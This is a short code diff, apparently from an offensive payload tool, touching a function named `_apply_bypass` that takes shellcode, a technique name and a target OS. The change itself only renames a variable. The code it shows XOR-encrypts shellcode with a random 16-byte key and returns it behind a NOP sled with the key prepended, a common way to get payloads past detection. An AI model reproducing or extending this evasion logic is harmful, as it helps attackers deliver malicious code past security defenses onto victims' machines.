@@ -635,11 +635,11 @@ def _apply_bypass(shellcode: bytes, technique: str, target_os: str) -> bytes:
         return bytes(mutated)
 
     elif technique == "encryption":
-        key = os.urandom(16)
+        enc_key = os.urandom(16)
         encrypted = bytearray(shellcode)
         for i in range(len(encrypted)):
-            encrypted[i] ^= key[i % 16]
-        return NOP_SLED + bytes(key) + bytes(encrypted)
+            encrypted[i] ^= enc_key[i % 16]
+        return NOP_SLED + bytes(enc_key) + bytes(encrypted)
 
     elif technique == "syscall":
         import socket
